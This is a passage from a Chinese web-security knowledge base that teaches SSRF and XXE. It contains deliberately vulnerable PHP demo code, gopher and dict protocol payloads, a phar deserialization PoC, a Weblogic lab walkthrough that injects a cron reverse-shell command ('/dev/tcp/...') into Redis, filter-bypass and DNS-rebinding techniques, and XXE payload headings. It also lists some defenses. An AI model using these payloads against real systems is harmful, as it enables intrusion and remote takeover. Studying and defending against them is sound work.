okhttp3.OkHttpClient; import okhttp3.Request; import okhttp3.Response; public class GetExample { final OkHttpClient client = new OkHttpClient(); String run(String url) throws IOException { Request request = new Request.Builder() .url(url) .build(); try (Response response = client.newCall(request).execute()) { return response.body().string(); } } public static void main(String[] args) throws IOException { GetExample example = new GetExample(); String response = example.run(\"https://raw.github.com/square/okhttp/master/README.md\"); System.out.println(response); } } Retrofit Retrofit 是 Square 公司出品的默认基于 OkHttp 封装的一套 RESTful 网络请求框架，适用于 Android 和 Java 的类型安全HTTP 客户端，示例代码： ```java Retrofit retrofit = new Retrofit.Builder() .baseUrl(\"https://api.github.com/\") .addConverterFactory(GsonConverterFactory.create()) .build(); GitHubService service = retrofit.create(GitHubService.class); RestTemplate RestTemplate是Spring用于同步客户端HTTP访问的中心类，遵循RESTful规范，简化了与 HTTP 服务器的通信。 RestTemplate restTemplate = new RestTemplate(); ResponseBean responseBean = restTemplate.postForObject(url, requestBean, ResponseBean.class); **OpenFeign** Feign是一个声明式WebService客户端，其工作原理是将注释处理成模板化的请求，通过占位符{id}来简化API的处理,示例代码： ```java interface Bank { @RequestLine(\"POST /account/{id}\") Account getAccountInfo(@Param(\"id\") String id); } public class BankService { public static void main(String[] args) { Bank bank = Feign.builder() .decoder(new AccountDecoder()) .options(new Request.Options(10, TimeUnit.SECONDS, 60, TimeUnit.SECONDS, true)) .target(Bank.class, \"https://api.examplebank.com\"); } } PHP 中的SSRF PHP 的网络请求函数 在PHP中使用fsockopen()、pfsockopen()、file_get_contents()、show_source()、highlight_file()、curl_exec()、curl_multi_exec()、fopen()、readfile()、mysqli_connect()、include()、require()、file()、copy()等函数不当可能导致SSRF漏洞。可以在php.net中搜索网络请求、套接字建立、数据库链接、文件操作相关的函数，部分函数使用的示例代码如下，代码审计时可根据关键字搜索函数进行分析： url = $_GET['url']; $this->port = $_GET['port']; } function SSRF_fsockopen() { echo \"\".__FUNCTION__.\"\"; $fp = fsockopen($this->url, $this->port, $errno, $errstr, 30); } function SSRF_pfsockopen() { echo \"\".__FUNCTION__ ; $fp = pfsockopen($this->url, $this->port, $errno, $errstr, 5); } function SSRF_file_get_contents(){ echo \"\".__FUNCTION__.\"\"; file_get_contents($this->url); } function SSRF_curl_exec(){ echo \"\".__FUNCTION__.\"\"; $ch = curl_init(); // 设置 URL 和相应的选项 curl_setopt($ch, CURLOPT_URL, $this->url); curl_setopt($ch, CURLOPT_HEADER, 0); // 抓取 URL 并把它传递给浏览器 curl_exec($ch); // 关闭 cURL 资源，并且释放系统资源 curl_close($ch); } function SSRF_curl_multi_exec(){ echo \"\".__FUNCTION__.\"\"; // 创建cURL资源 $ch1 = curl_init(); // 设置URL和相应的选项 curl_setopt($ch1, CURLOPT_URL, $this->url); curl_setopt($ch1, CURLOPT_HEADER, 0); // 创建批处理cURL句柄 $mh = curl_multi_init(); // 增加2个句柄 curl_multi_add_handle($mh,$ch1); $active = null; // 执行批处理句柄 do { $mrc = curl_multi_exec($mh, $active); } while ($mrc == CURLM_CALL_MULTI_PERFORM); while ($active && $mrc == CURLM_OK) { if (curl_multi_select($mh) != -1) { do { $mrc = curl_multi_exec($mh, $active); } while ($mrc == CURLM_CALL_MULTI_PERFORM); } } // 关闭全部句柄 curl_multi_remove_handle($mh, $ch1); curl_multi_close($mh); } function SSRF_fopen(){ echo \"\".__FUNCTION__.\"\"; fopen($this->url,\"r\"); } function SSRF_readfile(){ echo \"\".__FUNCTION__.\"\"; readfile($this->url); } function SSRF_mysqli_connect(){ echo \"\".__FUNCTION__.\"\"; mysqli_connect($this->url, \"my_user\", \"my_password\", \"my_db\"); } function SSRF_include(){ echo \"\".__FUNCTION__.\"\"; include \"$this->url\"; } function SSRF_require(){ echo \"\".__FUNCTION__.\"\"; require \"$this->url\"; } } $S = new SSRF; $S->SSRF_fsockopen(); //url=127.0.0.1&port=9666 $S->SSRF_pfsockopen(); //连接一直不会关闭, url=tcp://127.0.0.1&port=9666 ,可用 ssl://,tls:// $S->SSRF_file_get_contents();// url=http://127.0.0.1:9666/1.php $S->SSRF_curl_exec(); //url=http://127.0.0.1:9666/1.php $S->SSRF_curl_multi_exec(); // url=http://127.0.0.1:9666/1.php $S->SSRF_fopen(); //配置php.ini allow_url_fopen=On,url=http://127.0.0.1:9666/1.php $S->SSRF_readfile(); // url=http://127.0.0.1:9666/1.php $S->SSRF_mysqli_connect(); //url=127.0.0.1:9666 $S->SSRF_include(); //配置php.ini allow_url_include=On,需要文件名为.php,url=http://127.0.0.1:9666/1.php $S->SSRF_require(); //配置php.ini allow_url_include=On,需要文件名为.php,url=http://127.0.0.1:9666/1.php ?> SSRF 可利用的协议 JAVA 经过测试在JDK15中可以支持以下协议使用：http、https、ftp、file、jar、mailto*,openjdk9中移除了协议netdoc,JDK8中移除了gopher协议的支持。以webgoat靶场SSRF为例测试部分协议的使用，使用file协议读取文件/列目录(file:///etc/passwd)： file协议 Jar协议 需要源文件为zip或者jar包，来本地读取文件 jar:file:///home/luogan/Desktop/test.zip!/ShiroExploit.V2.51/config/keys.conf jar:file:///home/luogan/Desktop/ShiroExploit.V2.51/ShiroExploit.jar!/my.css jar协议读取远程文件(jar:http(s)://x.x.x/xx.zip!/file.txt)，同时会下载远程文件保存在本地缓存中： jar:http://127.0.0.1:8888/ShiroExploit.V2.51/ShiroExploit.jar!/my.css java.net.HttpURLConnection类转换 部分类支持的协议会进行限制，使用了HttpURLConnection对openConnection进行类型强制转换后的请求就只支持HTTP(S)： String html = \"\"; String line = \"\"; try{ HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(url).openConnection(); httpURLConnection.setConnectTimeout(10*1000); httpURLConnection.setReadTimeout(10*1000); httpURLConnection.setRequestProperty(\"Charset\", \"utf-8\"); InputStreamReader inputStreamReader = new InputStreamReader(httpURLConnection.getInputStream()); BufferedReader bufferedReader = new BufferedReader(inputStreamReader); while((line = bufferedReader.readLine())!=null){ html += line; } }catch (Exception e){ return getFailedResult(e.getMessage()); } mailto mailto协议可以用来发送邮件，该协议的利用需要后端配置了邮件的发送服务器和相关的支持才能正常使用，协议格式如下： mailto:name1@rapidtables.com?cc=name2@rapidtables.com&bcc=name3@rapidtables.com &subject=The%20subject%20of%20the%20email &body=The%20body%20of%20the%20email //抄送：name2@rapidtables.com //密送：name3@rapidtables.com //主题：The%20subject%20of%20the%20email //正文：The%20body%20of%20the%20email PHP 在PHP中支持的协议： dict:// — 词典网络协议(curl扩展支持) file:// — 访问本地文件系统 http:// — 访问 HTTP(s) URL ftp:// — 访问 FTP(s) URL php:// — 访问各种 I/O 流 zlib:// ——压缩流 data:// — 数据 (RFC 2397) glob:// — 查找匹配模式的路径名 phar:// — PHP 存档 ssh2:// — 安全外壳 2 rar:// — RAR ogg:// — 音频流 expect:// ——流程交互流 gopher:// —— 信息查找系统协议 DATA 协议 DATA协议配合include(require) Getshell data://text/plain,,+号使用url编码) data://image/jpeg, data://text/plain, data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b POST /index.php?url=data://text/plain, DICT 协议 DICT协议是词典网络协议，在RFC 2009中进行描述，使用空格或者:作为分隔参数。在利用dict协议中，一行只能包括一行命令，不能输入多行命令(所以不能攻击认证的redis)： 下面是具体攻击redis服务，由于Redis在Ubuntu上，写入定时任务会预检，导致无法执行，但是在centos上是没有问题的 对于 \\x3c ? => \\x3f : => \\x3a Gopher 协议 该协议在PHP中需要cURL扩展支持，使用curlexec(),curl_multi_exec()函数发起请求。gopher协议格式为gopher://IP:port/{TCP/IP数据流}，开始的字符可以随意，数据流使用URL编码，我们发送到的payload需要双编码，因为gopher协议会将url解码一次，再进行传输不认识\\r\\n或者?就不能成功 注意，GET 请求不带HTTP协议版本，POST请求一定要带HTTP协议版本 将?(%3f)编码成(%25%3f) gopher://192.168.200.38:8888/_%47%45%54%20%2f%74%65%73%74%2e%70%68%70%253f%66%69%6c%65%31%3d%73%68%65%6c%6c%2e%70%68%70%250d%250a%48%6f%73%74%3a%20%31%32%37%2e%30%2e%30%2e%31 POST需要Content-Type,Content-Length,HOST,POST_DATA，请求体整体URL编码 gopher://192.168.200.76:80/_%50%4f%53%54%20%2f%74%65%73%74%31%2e%70%68%70%20%48%54%54%50%20%2f%31%2e%31%250d%250a%48%6f%73%74%3a%20%31%32%37%2e%30%2e%30%2e%31%250d%250a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%250d%250a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%38%250d%250a%250d%250a%64%61%74%61%3d%31%32%33 PHAR 协议 PHAR协议用于在PHP中解析phar文件，phar文件的meta-data字段存在反序列化漏洞，可以使用协议读取文件触发反序列化，漏洞代码： output); } } file_get_contents($_GET[\"file\"]); 生成phar文件poc output; } } @unlink(\"phar.phar\"); $phar = new Phar('phar.phar'); $phar -> stopBuffering(); $phar -> setStub('GIF89a'.''); $phar -> addFromString('test.txt','test'); $object = new AnyClass(); $object -> output= 'system(\"whoami\");'; $phar -> setMetadata($object); $phar -> stopBuffering(); php://filter 读取本地文件并进行base64编码 php://filter/convert.base64-encode/resource=xx.xx php://filter/read=convert.base64-encode/resource=xx.xx php://input 可以获取请求中的原始流，如读取POST输入流 参考链接 https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 14:35:13 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/06.SSRF/ Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/06.SSRF/SSRF示例（weblogic_SSRF）.html":{"url":"知识库/01.WEB安全/06.SSRF/SSRF示例（weblogic_SSRF）.html","title":"SSRF示例（weblogic_SSRF）","keywords":"","body":" 环境介绍 背景 漏洞利用 注入HTTP头，利用Redis反弹shell 其他 参考链接 环境介绍 环境 版本/地址 weblogic WebLogic Server Version: 10.3.6.0 192.168.200.38 / 172.21.0.3 | | redis | redis_version:2.8.24 172.21.0.2 | 背景 Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。SSRF漏洞存在于http://192.168.200.38:7001/uddiexplorer/SearchPublicRegistries.jsp 访问一个可以访问的IP:PORT，如http://127.0.0.1:7001 可访问的端口将会得到错误，一般是返回status code（如下图），如果访问的非http协议，则会返回did not have a valid SOAP content-type。 修改为一个不存在的端口，将会返回could not connect over HTTP to server 通过错误的不同，即可探测内网状态。 漏洞利用 注入HTTP头，利用Redis反弹shell Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入%0d%0a来注入换行符，而某些服务（如redis写入计划任务(需要运行在centos上，Ubuntu的定时任务会预检格式是否正确，格式不正确无法启动，由于redis备份文件会带上redis特定的标识，所以Ubuntu不能实现定时任务反弹shell)）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。 首先，通过ssrf探测内网中的redis服务器（redis服务在172.21.0.2） 确定存在redis服务之后，通过注入换行符来写入命令至计划任务 set 1 \"\\n\\n\\n\\n0-59 0-23 1-31 1-12 0-6 root bash -c 'sh -i >& /dev/tcp/192.168.200.38/8888 0>&1'\\n\\n\\n\\n\" config set dir /etc/ config set dbfilename crontab save # url 编码为 %73%65%74%20%31%20%22%5c%6e%5c%6e%5c%6e%5c%6e%30%2d%35%39%20%30%2d%32%33%20%31%2d%33%31%20%31%2d%31%32%20%30%2d%36%20%72%6f%6f%74%20%62%61%73%68%20%2d%63%20%27%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%32%30%30%2e%33%38%2f%38%38%38%38%20%30%3e%26%31%27%5c%6e%5c%6e%5c%6e%5c%6e%22%0d%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%69%72%20%2f%65%74%63%2f%0d%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%62%66%69%6c%65%6e%61%6d%65%20%63%72%6f%6e%74%61%62%0d%0a%73%61%76%65 注意，换行符是\"\\r\\n\"，也就是\"%0D%0A\" 将url编码后的字符串放在ssrf的域名后面，发送： GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://172.21.0.2:6379/%0d%0a%0d%0a%73%65%74%20%31%20%22%5c%6e%5c%6e%5c%6e%5c%6e%30%2d%35%39%20%30%2d%32%33%20%31%2d%33%31%20%31%2d%31%32%20%30%2d%36%20%72%6f%6f%74%20%62%61%73%68%20%2d%63%20%27%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%32%30%30%2e%33%38%2f%38%38%38%38%20%30%3e%26%31%27%5c%6e%5c%6e%5c%6e%5c%6e%22%0d%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%69%72%20%2f%65%74%63%2f%0d%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%62%66%69%6c%65%6e%61%6d%65%20%63%72%6f%6e%74%61%62%0d%0a%73%61%76%65&rdoSearch=name&txtSearchname=11&txtSearchkey=11&txtSearchfor=1111&selfor=Business+location&btnSubmit=Search HTTP/1.1 Host: 192.168.200.38:7001 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Origin: http://192.168.200.38:7001 Connection: close Referer: http://192.168.200.38:7001/uddiexplorer/SearchPublicRegistries.jsp Cookie: publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|; ADMINCONSOLESESSION=RMpshL7ZPJ5PbTd26g8bNMCTjxvT74cgQ4bQv0tBk4BQZ14MhqhK!-1037380163; JSESSIONID=Zw8hhL7JJmZrsn1GXvYh9zThQnctb7SpJGTT9N9kl8DkkDQ32Gjp!-1037380163 Upgrade-Insecure-Requests: 1 实际redis服务接收到的请求如下图所示 写入计划任务后，执行反弹shell命令如下所示 其他 最后补充一下，可进行利用的cron有如下几个地方： /etc/crontab 这个是肯定的 /etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。 /var/spool/cron/root centos系统下root用户的cron文件 /var/spool/cron/crontabs/root debian系统下root用户的cron文件参考链接 https://vulhub.org/#/environments/weblogi.// Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 14:35:34 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/06.SSRF/SSRF示例（weblogic_SSRF）.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/06.SSRF/SSRF绕过方式.html":{"url":"知识库/01.WEB安全/06.SSRF/SSRF绕过方式.html","title":"SSRF绕过方式","keywords":"","body":" URL中使用@ IP进制转换 本地环回地址 punycode转码 同形异义字攻击（IDN_homograph_attack，IDN欺骗） 封闭式字母数字 (Enclosed Alphanumerics)字符 Redirect DNS解析 DNS 重绑定 点分割符号替换 短地址绕过 URL十六进制编码 在代码实现过程中，开发者为了防御SSRF漏洞，会对相关的请求进行验证(黑名单、白名单、正则匹配等)，但是其中一些过滤代码存在绕过的可能行，这里总结一些常见的绕过方法(部分方法只能在浏览器中或需要特定语言函数实现，需要结合场景使用，如进行一些社会工程学欺骗等)。 URL中使用@ URL(Uniform Resource Locator,统一资源定位符),用于在互联网中定位数据资源，其完整格式如下 [协议类型]://[访问资源需要的凭证信息]@[服务器地址]:[端口号]/[资源层级UNIX文件路径][文件名]?[查询]#[片段ID] 由格式可知，@符号之后是服务器的地址，可以用于在SSRF一些正则匹配中绕过，从而定位到@之后的服务器地址： http://google.com:80+&@220.181.38.251:80/#+@google.com:80/ curl 带着值为qq.com:的Authorization验证头访问百度 IP进制转换 IP地址是一个32位的二进制数，通常被分割为4个8位二进制数。通常用“点分十进制”表示成（a.b.c.d）的形式，所以IP地址的每一段可以用其他进制来转换。 IPFuscator 工具可实现IP地址的进制转换，包括了八进制、十进制、十六进制、混合进制。在这个工具的基础上添加了IPV6的转换和版本输出的优化： 在脚本对IP进行八进制转换时，一些情况下会在字符串末尾多加一个L: 这是因为在Python2下区分了int和long类型，int数据超出最大值2147483647后会表示为long类型，体现在八进制转换后的字符串末尾跟了个L: 而在python3中都使用int处理，所以可以将脚本升级到Python来用，使用2to3.py工具python3 2to3.py -w xx.py转换代码： 然后可以用python3来执行，但是在使用oct()转八进制的时候，有0o标记，这种的在访问时浏览器识别不了： 修正过后的代码如下： #!/usr/bin/env python # -*- coding:utf-8 -*- import random import re from argparse import ArgumentParser from IPy import IP __version__ = '0.1.0' def get_args(): parser = ArgumentParser() parser.add_argument('ip', help='The IP to perform IPFuscation on') parser.add_argument('-o', '--output', help='Output file') return parser.parse_args() def banner(): print(\"IPFuscator\") print(\"Author: Vincent Yiu (@vysecurity)\") print(\"https://www.github.com/vysec/IPFuscator\") print(\"Version: {}\".format(__version__)) print(\"\") def checkIP(ip): m = re.match('\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\Z', ip) if m: # Valid IP format parts = ip.split('.') if len(parts) == 4: # Valid IP for i in parts: if int(i) > 255 or int(i) 也可以使用IPy模块进行转换： import IPy #IPv4与十进制互转 IPy.IP('127.0.0.1').int() IPy.IP('3689901706').strNormal() #16进制转换 IPy.IP('127.0.0.1').strHex() #IPv4/6转换 IPy.IP('127.0.0.1').v46map() 本地环回地址 127.0.0.1，通常被称为本地回环地址(Loopback Address)，指本机的虚拟接口，一些表示方法如下(ipv6的地址使用http访问需要加[]): http://127.0.0.1 http://localhost http://127.255.255.254 127.0.0.1 - 127.255.255.254 http://[::1] http://[::ffff:7f00:1] http://[::ffff:127.0.0.1] http://127.1 http://127.0.1 http://0:80 punycode转码 IDN（英语：Internationalized Domain Name，缩写：IDN）即为国际化域名，又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。包括法语、阿拉伯语、中文、斯拉夫语、泰米尔语、希伯来语或拉丁字母等非英文字母，这些文字经多字节万国码编译而成。在域名系统中，国际化域名使用Punycode转写并以美国信息交换标准代码（ASCII）字符串储存。punycode是一种表示Unicode码和ASCII码的有限的字符集，可对IDNs进行punycode转码，转码后的punycode就由26个字母+10个数字，还有“-”组成。 使用在线的编码工具测试： 对正常的字母数字组成的域名，也可以使用punycode编码格式，即： www.qq.com => www.xn--qq-.com 一些浏览器对正常的域名不会使用punycode解码，如Chrome，所以在Chrome中访问失败，测试了部分PHP中的函数，也会失败： 同形异义字攻击（IDN_homograph_attack，IDN欺骗） 同形异义字指的是形状相似但是含义不同，这样的字符如希腊、斯拉夫、亚美尼亚字母，部分字符看起来和英文字母一模一样： 如果使用这些字符注册域名，很容易进行欺骗攻击(点击查看详情)，所以就出现了punycode转码，用来将含义特殊字符的域名编码为IDN，目前谷歌浏览器、Safari等浏览器会将存在多种语言的域名进行Punycode编码显示。 封闭式字母数字 (Enclosed Alphanumerics)字符 封闭式字母数字是一个由字母数字组成的Unicode印刷符号块，使用这些符号块替换域名中的字母也可以被浏览器接受。目前的浏览器测试只有下列单圆圈的字符可用： ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪浏览器访问时会自动识别成拉丁英文字符 Redirect 可以使用重定向来让服务器访问目标地址，可用于重定向的HTTP状态码：300、301、302、303、305、307、308。在github项目SSRF-Testing上可以看到已经配置好的用例： https:./.localdomain.pw/img-without-body/301-http-www.qq.com-.i.jpg https:./.localdomain.pw/img-without-body/301-http-169.254.169.254:80-.i.jpg https:./.localdomain.pw/json-with-body/301-http-169.254.169.254:80-.j.json 服务端PHP代码如下： DNS解析 配置域名的DNS解析到目标地址(A、cname等)，这里有几个配置解析到任意的地址的域名： nslookup 127.0.0.1.nip.io nslookup owasp.org.127.0.0.1.nip.io DNS 重绑定 如果某后端代码要发起外部请求，但是不允许对内部IP进行请求，就要对解析的IP进行安全限制，整个流程中首先是要请求一次域名对解析的IP进行检测，检测通过交给后面的函数发起请求。如果在第一次请求时返回公网IP,第二次请求时返回内网IP，就可以达到攻击效果。要使得两次请求返回不同IP需要对DNS缓存进行控制，要设置DNS TTL为0，测试cloudflare并不行： 那么还可以自定义DNS服务器，这样就能方便控制每次解析的IP地址了，使用SSRF-Testing项目中的dns.py脚本执行 python3 dns.py 216.58.214.206 169.254.169.254 127.0.0.1 53 localdomains.pw 在本地53端口开启DNS服务，为localdomains.pw指定两次解析IP，第一次是216.x，第二次是169.x。开启后使用 nslookup 1111.localdomains.pw 127.0.0.1 指定DNS服务器为127.0.0.1，查询解析记录： 这样一来，两次解析的IP就能方便的控制了。 点分割符号替换 在浏览器中可以使用不同的分割符号来代替域名中的.分割，可以使用。｡．来代替： http://www。qq。com http://www｡qq｡com http://www．qq．com 短地址绕过 这个是利用互联网上一些网站提供的网址缩短服务进行一些黑名单绕过，其原理也是利用重定向： URL十六进制编码 URL十六进制编码可被浏览器正常识别，编码脚本： data = \"www.qq.com\"; alist = [] for x in data: alist.append(hex(ord(x)).replace('0x', '%')) print(f'http://{\"\".join(alist)}') Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 14:35:49 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/06.SSRF/SSRF绕过方式.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/07.XXE/":{"url":"知识库/01.WEB安全/07.XXE/","title":"07.XXE","keywords":"","body":" 简介 XML基础 XML语法 XML DTD DTD简介 DTD实体 漏洞环境搭建 XXE基础利用 读取文件 SSRF 执行系统命令 拒绝服务攻击 XInclude攻击 哪些地方可能存在XXE 防御 Payload Basic Basic XML Example Entity Example Inband Injection Extract data from the server XXE Base64 encoded PHP Wrapper inside XXE OOB Injection Vanilla, used to verify outbound xxe or blind xxe OOB extraction1 OOB variation of above (seems to work better against .NET) OOB extraction2 OOB extra ERROR -- Java OoB XXE Base64 -- PHP OOB extra nice File-not-found exception based extraction FTP Inside SOAP body XXE inside SVG Untested - WAF Bypass DOS 包括一个随机的文件 Billion Laugh Attack - Denial Of Service 参考文章 简介 XXE（XML External Entity Injection）全称XML外部实体注入漏洞，既然是注入，说明也是执行了我们的恶意代码。 它产生的原因是：应用程序在解析XML内容时，没有禁止外部实体的加载，导致可加载恶意外部文件；因此如果XML内容可控，那么就可造成 文件读取 命令执行（难） 内网端口扫描 攻击内网网站 发起dos攻击等危害。 XML基础 既然漏洞是由于解析XML引起的，那么不了解一下XML怎么行呢？ XML和HTML长得有点类似，都是基于标签的格式，但是HTML被设计用来显示数据，XML则被设计用来传输和存储数据 XML语法 XML 声明文件的可选部分，如果存在需要放在文档的第一行 XML 必须包含根元素，它是所有其他元素的父元素，比如下面的userInfo元素 aaron 18 所有的 XML 元素都必须有一个关闭标签 paragraph 不能省略 --> XML 标签对大小写敏感。标签 与标签 是不同的，必须使用相同的大小写来编写打开标签和关闭标签 所有元素都必须彼此正确地嵌套 This text is bold and italic This text is bold and italic 属性都必须添加双引号，这点和HTML类似 aa XML注释和HTML一样 XML DTD DTD简介 XML DTD(Document Type Definition)文档类型定义的作用是定义 XML 文档的合法构建模块，它使用一系列合法的元素来定义文档的结构。 内部DOCTYPE声明 ]> d4m1ts 18 以上 DTD 解释如下： !DOCTYPE userInfo (第二行)定义此文档是 userInfo 类型的文档。 !ELEMENT userInfo (第三行)定义 userInfo 元素有两个元素：\"name、age\" !ELEMENT name (第四行)定义 name 元素为 \"#PCDATA\" 类型 PCDATA 是会被解析器解析的文本，这些文本将被解析器检查实体以及标记，文本中的标签会被当作标记来处理，而实体会被展开 CDATA 是不会被解析器解析的文本。在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。 外部DOCTYPE声明 Tove Jani Reminder Don't forget me this weekend! 在XML中，有5个预定义的实体引用，这是为了防止在解析的时候，给我们输入的当成标签来处理，导致异常 实体引用 字符 &lt; &gt; > &amp; & &quot; \" &apos; ' 举例 if salary &lt; 1000 then DTD实体 实体是用于定义引用普通文本或特殊字符的快捷方式的**变量**。 一个内部实体声明 ]> &name; 18 一个外部实体声明 漏洞环境搭建 服务器解析XML出现问题，那漏洞环境就写一个可以解析XML内容的代码即可。这里我用Java中的SAXReader这个类的read()方法来触发 依赖 org.dom4j dom4j 2.1.1 漏洞代码 import org.dom4j.Document; import org.dom4j.DocumentException; import org.dom4j.Element; import org.dom4j.io.SAXReader; import java.io.File; public class Main { public static void main(String[] args) throws DocumentException { SAXReader saxReader = new SAXReader(); Document document = saxReader.read(new File(\"src/main/resources/test.xml\")); Element rootElement = document.getRootElement(); System.out.println(rootElement.element(\"name\").getData()); } } test.xml ]> &name; 后续只需要修改test.xml中的内容即可 XXE基础利用 在上面加载外部实体声明的时候，可以注意到它的语法 可以从一个URL加载DTD，当然按照非正常的思维，允许输入URL也就相当于允许输入其他类似http的协议的链接，比如file、ftp这些，那这里岂不是至少就可能存在2个漏洞了 SSRF 任意文件读取 各语言支持的协议如下： LIBXML2 PHP JAVA .NET file file http file http http https http ftp ftp ftp https php file ftp compress.zlib jar compress.bzip2 netdoc data mailto glob gopher * phar 这里只介绍基础的带回显的利用方法，不带回显的可以参考下面的Payload 读取文件 读取/etc/passwd，这个明显是给file///etc/passwd的值赋值给name ]> &name; SSRF 简单的发起http请求，根据结果具体情况具体分析 ]> &name; 执行系统命令 比较鸡肋，比较难利用，要在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能吧 ]> &xxe; 拒绝服务攻击 递归引用，lol 实体具体还有 “lol” 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10 次 lol2 实体，此时一个 lol3 实体就含有 10^2 个 “lol” 了，以此类推，lol9 实体含有 10^8 个 “lol” 字符串,最后再引用lol9。 ]> &lol9; XInclude攻击 一些情况下，我们可能无法控制整个XML文档，也就无法完全XXE，但是我们可以控制其中一部分，这个时候就可以使用XInclude XInclude是XML规范的一部分，它允许从子文档构建XML文档。可以在XML文档中的任何数据值中放置XInclude Payload 要执行XInclude攻击，需要引用XInclude命名空间并提供要包含的文件的路径。例如： 哪些地方可能存在XXE 允许上传XML文件的地方 允许上传Excel、Word、SVG等文件的地方（因为这些文件本质也是XML） 请求中Content-Type允许为application/xml的数据包(可以手动修改，比如将application/json中的json直接修改为xml) ... 总而言之一句话：所有能传能解析XML数据给服务端的地方，都可能存在XXE。 防御 1、使用开发语言提供的禁用外部实体的方法 不同的类可能设置方法也不一样，具体情况具体分析。 php: libxml_disable_entity_loader(true); java: SAXReader saxReader = new SAXReader(); saxReader.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); Python: from lxml import etree xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 2、过滤用户提交的XML数据 过滤关键字：和，或者SYSTEM和PUBLIC。 3、不允许XML中含有自己定义的DTD Payload Basic Basic XML Example John Doe Entity Example ]> John &example; Inband Injection Extract data from the server ]> &file; ]>&xxe; ]>&xxe; XXE Base64 encoded %init; ]> PHP Wrapper inside XXE ]> Jean &xxe; Dupont 00 11 22 33 44 42 rue du CTF 75000 Paris ]> &xxe; OOB Injection Vanilla, used to verify outbound xxe or blind xxe ]> &sp; OOB extraction1 %sp; %param1; ]> &exfil; 外部实体 \"> OOB variation of above (seems to work better against .NET) %sp; %param1; %exfil; ]> 外部实体 \"> OOB extraction2 %sp; %param3; %exfil; ]> External dtd \"> OOB extra ERROR -- Java %sp; %param3; %exfil; ]> External dtd '> %param1; %external; OoB XXE Base64 -- PHP %remote;%int;%send; ]> \"> OOB extra nice \"> %dtd; ]> &all; External dtd File-not-found exception based extraction %one; %two; %four; ]> External dtd \"> FTP %asd; %c; ]> &rrr; External dtd \"> Inside SOAP body %dtd;]>]]> XXE inside SVG Untested - WAF Bypass DOS 包括一个随机的文件 ]> Billion Laugh Attack - Denial Of Service &lol9; 参考文章 从XML相关一步一步到XXE漏洞 xxe XML External Entity (XXE) Injection Payload List XXE_payloads Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 15:01:13 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/07.XXE/ Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/08.SSTI/":{"url":"知识库/01.WEB安全/08.SSTI/","title":"08.SSTI","keywords":"","body":" 定义 一些知识点 什么是模板/模板引擎？ 